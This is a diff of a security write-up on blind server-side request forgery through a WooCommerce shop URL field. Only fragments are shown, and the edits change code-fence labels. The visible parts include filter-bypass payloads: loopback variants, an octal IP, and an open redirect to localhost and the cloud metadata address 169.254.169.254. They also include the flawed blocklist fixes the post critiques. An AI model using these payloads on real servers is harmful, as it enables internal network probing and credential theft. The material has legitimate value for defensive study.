@@ -24,7 +24,7 @@ When integrating with e-commerce platforms like WooCommerce, the application pro
 
 The server attempts to reach the WooCommerce REST API by sending a request such as:
 
-```
+```python
 GET http://<shop_Url>/wp-json/wc/v1
 ```
 
@@ -47,7 +47,7 @@ By measuring these differences in response time, it’s possible to infer which 
 
 The following request is used to initiate the WooCommerce integration. When a target like 127.0.0.1:79 is provided, the server internally makes an HTTP request to that address.
 
-```
+```html
 POST /api/graphql HTTP/2  
 Host: redacted.com  
 Cookie: session_id=<SESSION_ID>;  
@@ -76,7 +76,7 @@ In this example, when the shop_Url parameter is set to 127.0.0.1:79, the server 
 
 #### **Estimated Fix & Why It Was Insufficient?**
 
-```
+```python
 if "127.0.0.1" in shop_Url or "localhost" in shop_Url:  
     raise ValidationError("Access to localhost is not allowed.")
 ```
@@ -94,7 +94,7 @@ In this scenario, the address 127.0.1.3 was used. Technically, it belongs to the
 
 The same WooCommerce integration scenario applies here. The user-supplied shop_Url is sent to the backend via a GraphQL mutation, as shown below:
 
-```
+```http
 POST /api/graphql HTTP/2  
 Host: redacted.com  
 Cookie: session_id=<SESSION_ID>;  
@@ -112,7 +112,7 @@ Content-Type: application/json
 
 Once the server receives this request, it performs the following internal HTTP call:
 
-```
+```http
 GET http://127.0.1.3:80/wp-json/wc/v1
 ```
 
@@ -138,7 +138,7 @@ This timing difference allows an attacker to bypass the blacklist and perform an
 
 #### **Estimated Fix & Why It Was Insufficient?**
 
-```
+```python
 import ipaddress  
 ip = ipaddress.ip_address(shop_Url.split(":")[0])  
 if ip in ipaddress.ip_network("127.0.0.0/8"):  
@@ -167,7 +167,7 @@ Thus, the backend IP resolution library understands this as 127.0.0.1. However, 
 
 #### HTTP Request
 
-```
+```http
 POST /api/graphql HTTP/2  
 Host: redacted.com  
 Cookie: session_id=<SESSION_ID>;  
@@ -185,13 +185,13 @@ Content-Type: application/json
 
 Once the server receives this request, it generates the following internal call:
 
-```
+```http
 GET http://0177.0000.0000.0001:80/wp-json/wc/v1
 ```
 
 However, technically, this is equivalent to:
 
-```
+```http
 GET http://127.0.0.1:80/wp-json/wc/v1
 ```
 
@@ -218,7 +218,7 @@ This timing behavior allows the attacker to infer the state of the port.
 
 #### **Estimated Fix & Why It Was Insufficient?**
 
-```
+```python
 import socket  
   
 try:  
@@ -243,7 +243,7 @@ The goal was to make the server believe the target URL was safe, while secretly 
 
 The shop_Url parameter provided by the user was set to:
 
-```
+```http
 http://307.r3dir.me/--to/?url=http://localhost:80
 ```
 
@@ -251,7 +251,7 @@ Although this URL appeared harmless at first glance, 307.r3dir.me was an open re
 
 #### HTTP Request
 
-```
+```http
 POST /api/graphql HTTP/2  
 Host: redacted.com  
 Cookie: session_id=<SESSION_ID>;  
@@ -296,7 +296,7 @@ Using this difference, open ports can once again be identified.
 
 #### **Estimated Fix & Why It Was Insufficient?**
 
-```
+```python
 import ipaddress  
 import socket  
 import requests  
@@ -323,7 +323,7 @@ The goal was not just to access localhost, but any internal IP blocks — es
 
 This time, the attacker supplied the following value in the shop_Url parameter:
 
-```
+```http
 http://307.r3dir.me/--to/?url=http://169.254.169.254
 ```
 
@@ -331,7 +331,7 @@ At a glance, this URL appears safe, as it includes a trusted-looking domain like
 
 #### HTTP Request
 
-```
+```http
 POST /api/graphql HTTP/2  
 Host: redacted.com  
 Cookie: session_id=<SESSION_ID>;  
